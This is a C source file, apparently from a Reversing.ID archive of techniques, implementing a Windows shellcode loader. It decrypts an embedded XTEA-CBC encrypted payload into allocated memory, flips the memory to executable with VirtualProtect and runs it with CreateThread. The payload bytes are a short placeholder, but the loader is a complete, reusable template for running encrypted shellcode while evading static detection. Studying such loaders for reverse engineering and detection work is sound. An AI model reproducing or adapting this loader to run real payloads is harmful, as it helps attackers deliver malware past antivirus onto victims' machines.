/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    XTEA with CBC mode
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

void block_decrypt (uint32_t val[2], uint32_t key[4])
{
    uint32_t v0 = val[0], v1 = val[1];
    uint32_t k0 = key[0], k1 = key[1], k2 = key[2], k3 = key[3];
    uint32_t delta = 0x9E3779B9, sum = 0xC6EF3720, i;

    // Round: 32
    for (i =  0; i < 32; i++)
    {
        // Inverse Round-Function
        v1  -= ((v0 << 4) + k2) ^ (v0 + sum) ^ ((v0 >> 5) + k3);
        v0  -= ((v1 << 4) + k0) ^ (v1 + sum) ^ ((v1 >> 5) + k1);
        sum -= delta;
    }

    val[0] = v0;
    val[1] = v1;
}

void decrypt (uint32_t * data, uint32_t block_count, uint32_t key[4], uint32_t iv[2])
{
    uint32_t i;
    uint32_t prev_block[2];
    uint32_t cipher_block[2];

    // cipher block which will be XORed
    prev_block[0] = iv[0];
    prev_block[1] = iv[1];

    for (i = 0; i < block_count; i += 2)
    {
        // store ciphertext for next XOR operation.
        cipher_block[0] = data[i    ];
        cipher_block[1] = data[i + 1];

        // decrypt ciphertext to plaintext
        block_decrypt(&data[i], key);

        // XOR ciphertext with previous block
        data[i    ] ^= prev_block[0];
        data[i + 1] ^= prev_block[1];

        prev_block[0] = cipher_block[0];
        prev_block[1] = cipher_block[1];
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    uint8_t     payload []  = { 0x5c, 0xbc, 0x86, 0x02, 0xae, 0xb9, 0xf4, 0xb3 };
    uint32_t    payload_len = 8;
    uint32_t    idx;

                    //    R E V E     R S I N     G . I D     1 3 3 7
    uint32_t key[4] = { 0x52455645, 0x5253494E, 0x472E4944, 0x31333337 };
    uint32_t iv[2]  = { 0x13510030, 0x13510030 };

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint32_t*)runtime, payload_len/4, key, iv);
    
    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}